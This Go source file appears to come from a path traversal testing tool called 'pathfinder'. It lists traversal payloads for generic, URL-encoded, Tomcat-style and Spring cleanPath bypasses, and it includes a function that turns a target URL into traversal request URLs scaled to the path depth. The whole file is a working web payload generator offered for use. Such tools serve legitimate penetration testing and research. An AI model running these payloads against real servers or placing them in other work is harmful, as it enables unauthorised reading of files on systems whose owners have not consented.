package pathfinder

import (
	"fmt"
	"strings"

	"github.com/dptsec/pathfinder/pkg/utils"
)

type Payload struct {
	Description string
	Path        string
	Padding     string
	MinLevel    int
}

var Payloads = []Payload{
	{
		Description: "Generic path traversal",
		Path:        "/..",
		Padding:     "/..",
		MinLevel:    1,
	},
	{
		Description: "Generic path traversal (URL encoded)",
		Path:        "/%2e%2e%2f",
		Padding:     "%2e%2e%2f",
		MinLevel:    1,
	},
	{
		Description: "Generic path traversal 2 (URL encoded slashes)",
		Path:        "/..%2f",
		Padding:     "..%2f",
		MinLevel:    1,
	},
	{
		Description: "Java based path normalization (Tomcat, others)",
		Path:        "/;../",
		Padding:     "../",
		MinLevel:    1,
	},
	{
		Description: "Spring cleanPath() vulnerability",
		Path:        "////",
		Padding:     "/../",
		MinLevel:    1,
	},
	/*
		 * TODO: this will need additional capabilities i.e. wordlist for detection
		{
			Description: "nginx alias traversal",
			Path:        "../",
			Padding:     "../",
			MinLevel:    2,
		},
	*/
}

func CreatePayloads(URL string) []string {
	var p []string

	levels, path, err := utils.ParsePath(URL)
	if err != nil {
		fmt.Printf("[-] CreatePayloads: %v\n", err)
		return p
	}

	fmt.Printf("%s -> %s: %d levels\n", URL, path, levels)
	for c := range Payloads {
		if levels < Payloads[c].MinLevel {
			continue
		}

		current := URL
		if strings.HasPrefix(Payloads[c].Path, "/") {
			current = utils.Trim(URL, "/")
		}

		if levels == 1 {
			current += Payloads[c].Path
		} else {
			current += Payloads[c].Path + strings.Repeat(Payloads[c].Padding, levels-2)
		}

		current = utils.Add(current, "/")
		p = append(p, current)
	}

	return p
}
